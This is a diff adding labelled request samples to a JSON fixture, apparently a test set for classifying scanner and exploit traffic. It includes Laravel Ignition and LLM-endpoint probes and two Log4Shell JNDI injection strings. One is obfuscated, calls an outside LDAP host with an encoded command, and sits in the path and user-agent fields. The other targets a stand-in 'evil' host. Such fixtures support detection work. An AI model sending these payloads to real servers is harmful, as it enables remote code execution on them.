@@ -2638,5 +2638,55 @@
     "body": "",
     "expected_purpose": "rce",
     "expected_name": "Tenda Router Command Injection"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "INVITE",
+    "path": "sip:0019093257122@<target-ip>:443",
+    "ua": "Cisco-CP8841",
+    "body": "",
+    "expected_purpose": "protocol_probe",
+    "expected_name": "SIP-over-HTTP Scan"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/_ignition/health-check",
+    "ua": "Mozilla/5.0 (Linux; Android 10; Pixel Build/QP1A.190711.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "Laravel Debug Mode RCE"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "POST",
+    "path": "/completion",
+    "ua": "Mozilla/5.0 (compatible; AIScan/1.0)",
+    "body": "{\"prompt\":\"Who wrote Hamlet?\",\"n_predict\":16,\"temperature\":0}",
+    "expected_purpose": "api_probe",
+    "expected_name": "AI/LLM API Endpoint Probe"
+  },
+  {
+    "type": "named",
+    "source": "db",
+    "method": "GET",
+    "path": "/?x=t%28%27%24%7B%24%7Benv%3ANaN%3A-j%7Dndi%24%7Benv%3ANaN%3A-%3A%7D%24%7Benv%3ANaN%3A-l%7Ddap%24%7Benv%3ANaN%3A-%3A%7D%2F%2F45.153.34.153%3A1389%2FTomcatBypass%2FCommand%2FBase64%2FKHdnZXQgLXFPLSBodH",
+    "ua": "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//45.153.34.153:1389/TomcatBypass/Command/Base64/KHdnZXQg",
+    "body": "",
+    "expected_purpose": "rce",
+    "expected_name": "Log4Shell"
+  },
+  {
+    "type": "named",
+    "source": "synthetic",
+    "method": "POST",
+    "path": "/api/log",
+    "ua": "Mozilla/5.0",
+    "body": "msg=${${lower:j}ndi:ldap://evil/a}",
+    "expected_purpose": "rce",
+    "expected_name": "Log4Shell"
   }
 ]
